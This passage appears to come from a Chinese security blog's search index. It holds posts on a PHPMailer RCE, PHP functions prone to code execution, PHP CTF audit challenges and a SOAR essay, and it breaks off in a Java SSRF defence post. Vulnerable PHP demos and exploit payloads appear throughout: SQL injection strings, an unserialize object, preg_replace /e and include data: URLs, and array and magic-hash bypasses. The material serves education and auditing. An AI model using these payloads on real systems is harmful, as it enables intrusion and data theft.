[EOF]\n发现被写入了包含在邮件标题或正文中的php代码，通过访问此log文件可以执行预先可控的php代码。\n关于POC可以看一下这些文章\nhttps://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.htmlhttp://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.htmlhttps://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.htmlhttp://blog.nsfocus.net/multiple-php-mail-function-vulnerability-analysis/?utm_source=tuicool&amp;utm_medium=referralhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033\n","categories":["安全技术"],"tags":["PHP"]},{"title":"PHP中容易产生命令执行漏洞的那些函数","url":"/PHP%E4%B8%AD%E5%AE%B9%E6%98%93%E4%BA%A7%E7%94%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%82%A3%E4%BA%9B%E5%87%BD%E6%95%B0/","content":"一 代码执行函数PHP中可以执行代码的函数。如eval()、assert()、``、system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec() 等\ndemo \n&lt;?phpecho `dir`;?&gt;\n\n\n\n二 文件包含代码注射文件包含函数在特定条件下的代码注射，如include()、include_once()、 require()、require_once()。\n当allow_url_include=On ，PHP Version&gt;=5.2.0 时，导致代码注射。\ndemo \n&lt;?phpinclude($_GET[&#x27;a&#x27;]);?&gt;\n\n访问http://127.0.0.1/include.php?a=data:text/plain,%3C?php%20phpinfo%28%29;?%3E 即执行phpinfo()\n三 正则匹配代码注射众所周知的preg_replace()函数导致的代码注射。当pattern中存在/e模式修饰符，即允许执行代码。这里我们分三种情况讨论下\n3.1 preg_replace() pattern 参数注射pattern即第一个参数的代码注射。当magic_quotes_gpc=Off时，导致代码执行。\ndemo\n&lt;?phpecho $regexp = $_GET[&#x27;reg&#x27;];$var = &#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;;preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &#x27;\\\\1&#x27;, $var);?&gt;\n访问http://127.0.0.1/preg_replace1.php?reg=%3C\\/php%3E/e 即执行phpinfo()\n3.2 preg_replace() replacement参数注射replacement即第二个参数的代码注射，导致代码执行。\ndemo \n&lt;?preg_replace(&quot;/test/e&quot;,$_GET[&#x27;h&#x27;],&quot;jutst test&quot;);?&gt;\n当我们提交 http://127.0.0.1/preg_replace2.php?h=phpinfo() 即执行phpinfo()。\n3.3 preg_replace()第三个参数注射我们通过构造subject参数执行代码。提交：http://127.0.0.1/preg_replace3.php?h=[php]phpinfo()[/php]\n或者 http://127.0.0.1/preg_replace3.php?h=[php]$&#123;phpinfo%28%29&#125;[/php] 导致代码执行\ndemo\n&lt;?preg_replace(&quot;/\\s*\\[php\\](.+?)\\[\\/php\\]\\s*/ies&quot;, &quot;\\\\1&quot;, $_GET[&#x27;h&#x27;]);?&gt;\n四 动态代码执行4.1 动态变量代码执行demo\n&lt;?php$dyn_func = $_GET[&#x27;dyn_func&#x27;];$argument = $_GET[&#x27;argument&#x27;];$dyn_func($argument);?&gt;\n我们提交 http://127.0.0.1/dyn_func.php?dyn_func=system&amp;argument=ipconfig 执行ipconfig命令\n4.2 动态函数代码执行demo\n&lt;pre lang=&quot;php&quot; file=&quot;demo42.php&quot; colla=&quot;+&quot;&gt;&lt;?php$foobar = $_GET[&#x27;foobar&#x27;];$dyn_func = create_function(&#x27;$foobar&#x27;, &quot;echo $foobar;&quot;);$dyn_func(&#x27;&#x27;);?&gt;\n我们提交 http://127.0.0.1/create_function.php?foobar=system%28dir%29 执行dir命令\n五 其他5.1 ob_start()函数的代码执行demo code 5.1:\n&lt;pre lang=&quot;php&quot; file=&quot;demo51.php&quot; colla=&quot;+&quot;&gt;&lt;?php$foobar = &#x27;system&#x27;;ob_start($foobar);echo &#x27;dir&#x27;;ob_end_flush();?&gt;\n5.2 array_map()函数的代码执行demo \n&lt;pre lang=&quot;php&quot; file=&quot;demo52.php&quot; colla=&quot;+&quot;&gt;&lt;?php$evil_callback = $_GET[&#x27;callback&#x27;];$some_array = array(0, 1, 2, 3);$new_array = array_map($evil_callback, $some_array);?&gt;&lt;/pre&gt;\n我们提交 http://127.0.0.1/array_map.php?callback=phpinfo 即执行phpinfo()\n5.3 unserialize()与eval()unserialize（）是PHP中使用率非常高的函数。不正当使用unserialize（）容易导致安全隐患。\ndemo\n&lt;pre lang=&quot;php&quot; file=&quot;demo53.php&quot; colla=&quot;+&quot;&gt;&lt;?phpclass Example &#123;var $var = &#x27;&#x27;;function __destruct() &#123;eval($this-&gt;var);&#125;&#125;unserialize($_GET[&#x27;saved_code&#x27;]);?&gt;&lt;/pre&gt;\n我们提交 http://127.0.0.1/unserialize.php?saved_code=O:7:%22Example%22:1:&#123;s:3:%22var%22;s:10:%22phpinfo%28%29;%22;&#125; 即执行phpinfo()\n5.4 容易导致安全问题的函数同类型函数还有很多\narray_map()usort(), uasort(), uksort()array_filter()array_reduce()array_diff_uassoc(), array_diff_ukey()array_udiff(), array_udiff_assoc(), array_udiff_uassoc()array_intersect_assoc(), array_intersect_uassoc()array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()array_walk(), array_walk_recursive()xml_set_character_data_handler()xml_set_default_handler()xml_set_element_handler()xml_set_end_namespace_decl_handler()xml_set_external_entity_ref_handler()xml_set_notation_decl_handler()xml_set_processing_instruction_handler()xml_set_start_namespace_decl_handler()xml_set_unparsed_entity_decl_handler()stream_filter_register()set_error_handler()register_shutdown_function()register_tick_function()\n\n\n","categories":["安全技术"],"tags":["PHP"]},{"title":"PHP代码审计TIPS","url":"/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1TIPS/","content":"&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;);   die(&quot;have a fun!!&quot;);&#125;foreach([$_GET, $_POST] as $global_var) &#123;     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     &#125; &#125; function is_palindrome_number($number) &#123;     $number = strval($number);     $i = 0;     $j = strlen($number) - 1;     while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; if(is_numeric($_REQUEST[&#x27;number&#x27;]))&#123;   $info=&quot;sorry, you cann&#x27;t input a number!&quot;;&#125;elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;])))&#123;     $info = &quot;number must be equal to it&#x27;s integer!! &quot;;  &#125;else&#123;     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;     else     &#123;          if(is_palindrome_number($req[&quot;number&quot;]))&#123;              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;           &#125;          else          &#123;             $info=$flag;          &#125;     &#125;&#125;echo $info;\n\n\n&lt;?php    include &#x27;common.php&#x27;;    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);    //把一个或多个数组合并为一个数组    class db    &#123;        public $where;        function __wakeup()        &#123;            if(!empty($this-&gt;where))            &#123;                $this-&gt;select($this-&gt;where);            &#125;        &#125;        function select($where)        &#123;            $sql = mysql_query(&#x27;select * from user where &#x27;.$where);            //函数执行一条 MySQL 查询。            return @mysql_fetch_array($sql);            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false        &#125;    &#125;    if(isset($requset[&#x27;token&#x27;]))    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。    &#123;        $login = unserialize(gzuncompress(base64_decode($requset[&#x27;token&#x27;])));        //gzuncompress:进行字符串压缩        //unserialize: 将已序列化的字符串还原回 PHP 的值        $db = new db();        $row = $db-&gt;select(&#x27;user=\\&#x27;&#x27;.mysql_real_escape_string($login[&#x27;user&#x27;]).&#x27;\\&#x27;&#x27;);        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。        if($login[&#x27;user&#x27;] === &#x27;ichunqiu&#x27;)        &#123;            echo $flag;        &#125;else if($row[&#x27;pass&#x27;] !== $login[&#x27;pass&#x27;])&#123;            echo &#x27;unserialize injection!!&#x27;;        &#125;else&#123;            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;        &#125;    &#125;else&#123;        header(&#x27;Location: index.php?error=1&#x27;);    &#125;?&gt; \n\n&lt;?php$arr = array(&#x27;user&#x27; =&gt; &#x27;ichunqiu&#x27;);$a = base64_encode(gzcompress(serialize($arr)));echo $a;?&gt;\n\n\n&lt;?phperror_reporting(0);if (!isset($_POST[&#x27;uname&#x27;]) || !isset($_POST[&#x27;pwd&#x27;])) &#123;    echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;/form&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;!--source: source.txt--&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;      if (is_array($StrValue))&#123;//检测变量是否是数组        $StrValue=implode($StrValue);//返回由数组元素组合成的字符串    &#125;    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   //匹配成功一次后就会停止匹配        print &quot;水可载舟，亦可赛艇！&quot;;        exit();    &#125;&#125;$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)&quot;;foreach($_POST as $key=&gt;$value)&#123; //遍历数组    AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con)&#123;    die(&#x27;Could not connect: &#x27; . mysql_error());&#125;$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);//设置活动的 MySQL 数据库$sql=&quot;SELECT * FROM interest WHERE uname = &#x27;&#123;$_POST[&#x27;uname&#x27;]&#125;&#x27;&quot;;$query = mysql_query($sql); //执行一条 MySQL 查询if (mysql_num_rows($query) == 1) &#123; //返回结果集中行的数目    $key = mysql_fetch_array($query);//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false    if($key[&#x27;pwd&#x27;] == $_POST[&#x27;pwd&#x27;]) &#123;        print &quot;CTF&#123;XXXXXX&#125;&quot;;    &#125;else&#123;        print &quot;亦可赛艇！&quot;;    &#125;&#125;else&#123;    print &quot;一颗赛艇！&quot;;&#125;mysql_close($con);?&gt;\n\nadmin&#x27; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -\n\n$flag=&#x27;xxx&#x27;; extract($_GET); if(isset($shiyan)) &#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &#123;         echo&#x27;ctf&#123;xxx&#125;&#x27;;     &#125;   else   &#123;     echo&#x27;Oh.no&#x27;;   &#125;    &#125;\n\n变量覆盖漏洞PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。file_get_contents：远程获取获取文件，若没有则为空构造shiyan=&amp;flag=1\n\n&lt;?php if (isset ($_GET[&#x27;password&#x27;])) &#123;  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE)  &#123;    echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;;  &#125;  else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999)   &#123;     if (strpos ($_GET[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE)       &#123;      die(&#x27;Flag: &#x27; . $flag);      &#125;      else      &#123;        echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;);        &#125;      &#125;     else      &#123;        echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;;       &#125;   &#125; ?&gt;\n\nereg漏洞payload：1e9%00*-*正则%00截断\nif (isset($_GET[&#x27;a&#x27;])) &#123;      if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0)     //比较两个字符串（区分大小写）         die(&#x27;Flag: &#x27;.$flag);      else          print &#x27;离成功更近一步了&#x27;;  &#125;\n\npayload:?a[]=1\n\n漏洞原理\n在5.3的版本之后使用strcmp函数比较会返回0\n\n&lt;?phpif (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123;    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])        echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;;    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))      die(&#x27;Flag: &#x27;.$flag);    else        echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;&#125;else    echo &#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;;?&gt;\n\n===会比较类型，比如bool。sha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型?name[]=a&amp;password[]=b\n\n&lt;?phpsession_start(); if (isset ($_GET[&#x27;password&#x27;])) &#123;    if ($_GET[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])        die (&#x27;Flag: &#x27;.$flag);    else        print &#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;\n\n抓包删掉cookie中的session即可\n\n&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;    $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user=&#x27;$user&#x27;&quot;;$query = mysql_query($sql);if (!$query) &#123;    printf(&quot;Error: %s\\n&quot;, mysql_error($conn));    exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123;    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  &#125;&#125;?&gt;\n\n 通过构造sql语句使row[pw]等于pass\n&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123;  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt;\n\n正则漏洞，%00截断\n&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select user from php where (user=&#x27;$user&#x27;) and (pw=&#x27;$pass&#x27;)&quot;;$query = mysql_query($sql);if (!$query) &#123;    printf(&quot;Error: %s\\n&quot;, mysql_error($conn));    exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];  if($row[&#x27;user&#x27;]==&quot;admin&quot;) &#123;    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;&quot;;  &#125;  if($row[&#x27;user&#x27;] != &quot;admin&quot;) &#123;    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);  &#125;&#125;?&gt;\n\n闭合注入，绕过验证\n&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];else    $cip = &quot;0.0.0.0&quot;;return $cip;&#125;$GetIPs = GetIP();if ($GetIPs==&quot;1.1.1.1&quot;)&#123;echo &quot;Great! Key is *********&quot;;&#125;else&#123;echo &quot;错误！你的IP不在访问列表之内！&quot;;&#125;?&gt;\n\n添加http头即可\n&lt;?php$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;    echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123;    echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125;?&gt;\n\n240610708神奇的数字\n&lt;?phpif($_GET[id]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $id = intval($_GET[id]);  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#x27;$id&#x27;&quot;));  if ($_GET[id]==1024) &#123;      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;  &#125;  else&#123;    echo($query[content]);  &#125;&#125;?&gt;\n\n1024.1\nif (isset ($_GET[&#x27;nctf&#x27;])) &#123;    if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE)        echo &#x27;必须输入数字才行&#x27;;    else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)           die(&#x27;Flag: &#x27;.$flag);    else        echo &#x27;骚年，继续努力吧啊~&#x27;;&#125;\n\n此处还可以数组绕过\n#GOAL: login as admin,then get the flag;error_reporting(0);require &#x27;db.inc.php&#x27;;function clean($str)&#123;    if(get_magic_quotes_gpc())&#123;        $str=stripslashes($str);    &#125;    return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&#x27;username&#x27;]);$password = @clean((string)$_GET[&#x27;password&#x27;]);$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND pass=\\&#x27;&#x27;.$password.&#x27;\\&#x27;;&#x27;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123;    die(&#x27;Invalid password!&#x27;);&#125;echo $flag;\n\n$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;admin\\&#x27;\\&#x27; AND pass=\\&#x27;&#x27;or 1 #&#x27;\\&#x27;;&#x27;;\n\n&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $user = $_POST[user];  $pass = md5($_POST[pass]);  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27; $user &#x27;&quot;));  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;    //strcasecmp:0 - 如果两个字符串相等      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;  &#125;  else &#123;    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  &#125;&#125;?&gt;\n\npayload:user=admin&#x27; and 0=1 union select &#x27;47bce5c74f589f4867dbd57e9ca9f808&#x27; #&amp;pass=aaa\n\n\n\n","categories":["安全技术"],"tags":["PHP"]},{"title":"从SOAR(安全编排自动化与响应)中求解安全运营之法","url":"/SOAR(%E5%AE%89%E5%85%A8%E7%BC%96%E6%8E%92%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8E%E5%93%8D%E5%BA%94)%E4%B8%AD%E6%B1%82%E8%A7%A3%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B9%8B%E6%B3%95/","content":"\n\n凡学问者，皆有术法道三大层次。法者，于术精通而升华成理，复以理指导术之提高，学问之提高层次。达于法者，达中乘也。\n\n\n\n0x00 个人理解的企业应用安全建设参与企业应用安全建设两年有余，在公司的应用安全建设比较早期的时候参与进来，最近一年又有幸深度参与了多家中小型公司的应用安全建设，无论是基于云安全平台还是基于自研平台的企业安全建设都有了些许思考。也渐渐构建起了自己的安全观，\n“企业安全建设是一个动态博弈需要持续投入的过程。安全是业务的一个重要属性，是业务的核心竞争力之一，应用安全的本质是运营。安全建设更重要的是看待安全问题的思路、角度和高度。攻防之道，相辅相成。”\n什么是运营，一切围绕着网站产品进行的人工干预都叫运营，那什么又是强运营呢，直白点就是需要大量人工参与、与其它角色大量沟通的运营。从笔者的角度来看，企业安全建设就是一个强运营的工作，尤其是在安全建设后期，平台、工具、制度相对完善之后。大量的运营使人痛苦，尤其对技术安全运营来说尤甚，所以在很长的时间里思考这个困境的解法，有了些许思路，通过本文中将自己对企业安全中应用安全建设的思考和大家分享下。\n当企业开始应用安全建设时，一般会经历这几个阶段：采购阶段、自研阶段、产品闭环，以期实现高效运营的目标。\n0x01 采购阶段这个阶段相信很多经历过“一个人的安全部”的都会深有感触，简单调研之后，大概率会发现这样一个事实————“一穷二白”，好一点的可能运维或IT同学已经做了一部分，例如系统漏洞、高危端口等，但很明显远远不够的。这时候就要开始采购安全产品了，“管它好不好用，先止血”。对各个乙方的安全解决方案进行调研，在各个开源社区寻找各类开源安全工具、平台，在耗费了大量精力和经历安全预算申请的绝望后，终于部署了防火墙、IDS等安全产品，从开源社区找到了SOC平台、扫描器、风控平台等开源安全产品。枪有了，能不能打道猎物还是要看人。同样，安全产品怎么来用才能发挥最大价值是个值得思考的事情，需要大量的内部调研，尝试与已有的流程、机制、产品进行配合，以及如何得到高层的帮助，这就需要大家各显神通了。\n在对接时，会发现在不经过二次开发的情况下很难实现有效的配合，更多的是在各自为战。与此同时，需要对这些产品进行运营，处理报警日志、漏洞扫描、漏洞的推动修复、应用上线审核、活动风险控制、各类安全应急等等，现阶段如果想要全部一手抓，难度有点大。笔者认为，在甲方做企业安全建设，最终还是要对结果负责，对于安全效果，有两个指标是最关键的核心指标，一个是漏洞/事件数，一个是安全产品覆盖面。\n所以在初期阶段没法全覆盖的情况下，最有效的办法是找到业务最痛最关心的点，重点保障，得到认可。通过短期快速止血和长期安全机制建设相结合的方法迭代改进来度过这一阶段。为什么要找到业务最痛最关心的点呢？企业的安全是100%服务保障业务的，业务永远是第一位的，有业务才有安全。(当然如果公司的业务都是基于云产品部署的，那可以直接跳过这一阶段了，云平台提供的一整套安全产品对于基本的安全保障还是很有效的。)\n0x02 自研阶段经历了采购阶段安全建设后，有了一定的安全水位，安全团队的配置也得到相应的提高，在基于开源或采购的安全产品进行运营时，被大量平台之间的协作搞得焦头烂额，迫切的需要开始安全平台的部分自研。\n在这提一嘴安全团队的建设，笔者认为的安全团队组成主要有攻防、运营、开发三部分组成，其中开发又分为安全工具开发和安全平台开发，其中的区别在于安全工具开发需要专业的攻防能力，而安全平台开发则更侧重于开发本身，专业的人做专业的事，让一个安全同学去开发一个安全运营平台与现有的代码构建等平台进行对接是一件很困难的事情，所以就需要专业的开发来做这部分工作。\n没有哪套安全解决方案可以应用在所有企业上，这就需要安全团队针对当前的业务模式、系统架构、发布流程等针对性的开发一些工具或平台来使安全解决方案更契合当前企业的技术栈。\n例如SDL中的应用发布流程，其中最重要的莫过于发布卡点，卡点又要依赖代码安全扫描，而每个公司使用的开发框架往往不同，甚至在某些公司会对开发框架进行大量的修改，这种情况下通用的代码扫描就不可靠了，就需要对代码安全扫描器进行改造或自研，然后扫描出的漏洞需要通过漏洞运营平台来管理，如何修复对于开发来说也是个棘手的问题，要解决快速修复的问题就需要完整的代码级解决方案，好多公司都有安全包的组件供开发使用。例子只是其中的一个点，这一阶段往往是漫长的，平台和工具会经过一次次的迭代，最终和业务达到和平共处的状态。\n为什么需要专业的开发，一个很重要的原因是需要工程化的能力，这里引用《赵彦的CISO闪电战：两年甲方安全修炼之路》中的一句话，“工程化能力体现在能把自研的安全产品、安全系统落地于海量分布式环境，落地于规模庞大的组织的IT系统上，且不降低性能，不影响可用性，不出故障和运营事故”。\n因为安全产品导致的大型故障发生过很多起，安全产品有时候就是一个双刃剑，例如WAF，既能挡住恶意攻击，也有可能会把正常用户拒之门外。如果安全自身把业务给搞瘫痪了，那要安全还有何用，在很多情况下，稳定性往往是高于安全性的，凸显出工程化体系化的重要性。\n0x03 产品闭环每个企业的安全思路都是不完全相同的，经过了自研阶段后，会形成自己企业特有的安全建设解决方案。漫长的自研阶段度过后，可能会有同学认为“纵深防御体系”（笔者理解的纵深防御，从系统、中间件、网络、应用、业务等各个环节布控，一道道防线由外到内共同组成整个防御体系）已经建设完成。从产品上来说，或许是的。但是从安全运营的角度来看，当前每个产品都还是孤立的点，产品之间的联动更多的是靠人工运营。\n拿漏洞的运营举例，一个漏洞的生命周期通常是漏洞产生（SRC、内部发现、工具发现、威胁情报）、漏洞确认（是否误报、定级）、漏洞分配（对应的开发修复）、修复审核（是否修复以及修复方案的健壮性）、漏洞关闭，这其中就需要SRC、工具、TIP、SOC、开发中台、SIEM等平台的联动，来实现漏洞生命周期的闭环。类似闭环还有很多，但是工具类的产品闭环往往不是那么容易，这时可以寻找突破点，做产品的小闭环。\n0x04 运营的痛点安全人员短缺、报警数量多、处置速度无法保证、处置经验有效沉淀少、威胁态势愈加危险和复杂等等\n往往在安全产品闭环阶段后，技术安全团队的大小会稳定下来甚至会缩小，应用安全运营人员也会越来越少，在笔者看来这是一个正常的进化过程。但是业务的扩张并没有停止，应用也是一刻不停发布上线，随着企业规模越来越大，暴露的攻击面也越来越广，各类报警、漏洞大量增加，在有限的人力下，处置速度和经验沉淀很难有保障，更不用说现在大环境下安全形势了。\n求变之心愈加强烈。\n0x05 SOAR是否是一剂良药？思考这个问题很久了，应用安全建设强运营的困境该如何去突围？ 从最初的鼓吹AI到回归现实，终于从SOAR(安全编排自动化与响应)中看到些许希望。\n简单介绍一下SOAR，SOAR是Gartner 2018年在安全领域定义的最新前沿技术，与UEBA、EDR等侧重于威胁识别发现的技术不同，SOAR集中在识别后的威胁处理，强调用户可以通过事件编排中心通过编码实现任意的威胁处理逻辑。\nSOAR 是一系列技术的合集，它能够帮助企业和组织收集安全运维团队监控到的各种信息（包括各种安全系统产生的告警），并对这些信息进行事件分析和告警分诊。然后在标准工作流程的指引下，利用人机结合的方式帮助安全运维人员定义、排序和驱动标准化的事件响应活动。SOAR 工具使得企业和组织能够对事件分析与响应流程进行形式化的描述。\nSOAR相关的安全产品在国外国内都已经有安全公司进入到这个领域，但是在本文中，不去讨论具体的实现和产品，而是将其视作一个方法论，领会它的思路，尝试将其融入到产品自研和产品闭环中去。\n看一下SOAR的组成，编排、自动化、响应，其实从名字中已经给了我们答案，笔者认为，最核心的思想在于Orchestration和Automation，先将事件处理流程或其它的流程通过编排的方式形成闭环，然后对其中大量重复工作的部分进行自动化。 至于响应，也是同理，具体的以后详谈。\n有一点需要明确，目前通过应用SOAR来实现全自动组织和缓解的情况非常罕见，安全没有银弹，大多数缓解和阻断仍然需要安全人员的参与。但是SOAR的思想非常值得借鉴，尤其是在经历采购阶段、产品自研、产品闭环这几个阶段后，思考能不能通过SOAR的方法论来减轻工作量。\n例如漏洞扫描的流程，发现、上报、分配确认、修复确认，其中发现、上报、修复确认均可以实现自动化，再比如各类安全警报的处理也可以应用这套方法论。\n让专业的人来处理专业的事，用自动化来处理重复工作，或许是突围应用安全强运营困境的一个解法。SOAR目前还处于成长期，保持期待和不断探索。\nModern Security Operations Center = SOAR + SIEM + UEBA + OTHER\n","categories":["应用安全"],"tags":["THINK"]},{"title":"SSRF代码审计和防御策略 for Java","url":"/SSRF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%20for%20Java/","content":"1、Java代码中的SSRF触发点SSRF的产生需要满足两个点：1. 接收外部传入的地址，2.发送请求。\nURLHttpClientHttpURLConnectionImageIODriverManagerSocketOkHttpClient……\n2、如何防御SSRF攻击2.1 白名单判断public class SSRFWhiteChecker extends WhiteChecker &#123;    private static 